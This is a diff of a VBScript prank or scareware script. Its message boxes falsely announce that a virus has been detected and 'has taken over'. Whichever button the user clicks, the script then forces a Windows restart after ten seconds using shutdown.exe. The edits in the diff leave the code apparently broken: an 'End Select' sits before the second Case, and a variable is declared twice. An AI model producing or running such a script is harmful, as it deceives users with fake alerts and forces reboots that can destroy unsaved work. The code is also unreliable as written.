@@ -1,5 +1,3 @@
-Option Explicit
-
 msg1=msgbox("A virus has been detected, and this file has been disabled.", 0+16, "Virus detected.")
 
 msg2=msgbox("Would you like to delete this file?", 4+64, "Virus detected.")
@@ -31,11 +29,12 @@ Case vbYes
 		Dim objShell
         	Set objShell = WScript.CreateObject("WScript.Shell")
         	objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 10"
+	End Select
 
 Case vbNo
 	msg9=msgbox("Virus has taken over", 0+64, "Virus")
 	msg10=msgbox("Shutting down in 10 seconds.", 2+64, "Shutting down.")
 	Dim objShell
-        	Set objShell = WScript.CreateObject("WScript.Shell")
-        	objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 10"
-	
+        Set objShell = WScript.CreateObject("WScript.Shell")
+        objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 10"
+End Select
